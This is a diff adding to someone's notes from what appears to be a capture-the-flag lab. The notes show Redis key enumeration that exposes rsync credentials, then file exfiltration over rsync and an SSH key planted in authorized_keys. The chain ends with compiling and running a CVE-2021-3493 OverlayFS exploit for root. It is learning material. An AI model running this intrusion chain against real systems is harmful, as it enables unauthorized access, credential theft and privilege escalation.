@@ -29,7 +29,10 @@ if value is of type lists -> lrange <key> <start> <end>
 if value is of type sets -> smembers <key>
 if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
 
+10.10.63.208:6379> type "authlist"
 10.10.63.208:6379> lrange "authlist" 0 100
+
+We found that > rsync rsync://rsync-connect@10.10.63.208/ && its' password
 
 Rsync
 -----
@@ -41,4 +44,20 @@ nc -vn 10.10.63.208 873
 #list
 #rsync rsync://rsync-connect@10.10.63.208/files
 #rsync rsync://rsync-connect@10.10.63.208/files/sys-internals
-#rsync -av rsync://rsync-connect@10.10.63.208/files/sys-internals /tmp/
+#rsync -av rsync://rsync-connect@10.10.63.208/files/sys-internals /tmp/ (copy the whole sys-internals to the /tmp)
+
+We have access to the rsync so that upload our id_rsa.pub to the rsync
+
+#rsync /home/sak/victor/id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys
+
+Connect with ssh private key
+----------------------------
+#sudo ssh sys-internal@10.10.96.14 -i /home/victor/.ssh/id_rsa
+
+When I upload linpeas.sh > ubuntu 18.04 version > it has OverlayFS vulnerability ( CVE-2021–3493 ) > exploit.c
+
+sys-internal > gcc exploit.c -o exploit
+             > ./exploit
+
+We got a root user.
+
